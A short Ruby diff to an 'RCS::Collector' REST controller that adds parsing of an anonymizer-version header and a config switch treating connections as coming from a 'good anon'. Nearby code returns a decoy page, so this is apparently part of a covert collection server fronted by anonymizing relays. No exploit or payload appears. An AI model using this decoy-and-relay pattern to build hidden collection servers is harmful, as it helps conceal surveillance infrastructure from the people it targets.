@@ -125,6 +125,9 @@ class RESTController
     peer = http_get_forwarded_peer(@request[:headers])
     @request[:peer] = peer unless peer.nil?
 
+    # get the anonimizer version
+    @request[:anon_version] = http_get_anon_version(@request[:headers])
+
     response = send(@request[:action])
 
     return decoy_page if response.nil?
@@ -173,6 +176,19 @@ class RESTController
     trace :info, "[#{@request[:peer]}] has forwarded the connection for [#{peers.first}]"
     # we just want the first peer that is the original one
     return peers.first
+  end
+
+  def http_get_anon_version(headers)
+    ver = headers[:x_proxy_version]
+    # no header, we assume the lowest version ever
+    if ver.nil?
+      # if the collector can be used without anonimizer, mark it as the highest possible version
+      # this will cause the connection to be always coming from a good anon
+      return "9999123101" if Config.instance.global['COLLECTOR_IS_GOOD']
+      return "0"
+    end
+    trace :info, "[#{@request[:peer]}] is a connection thru anon version [#{ver}]"
+    return ver
   end
 
 end # RCS::Collector::RESTController
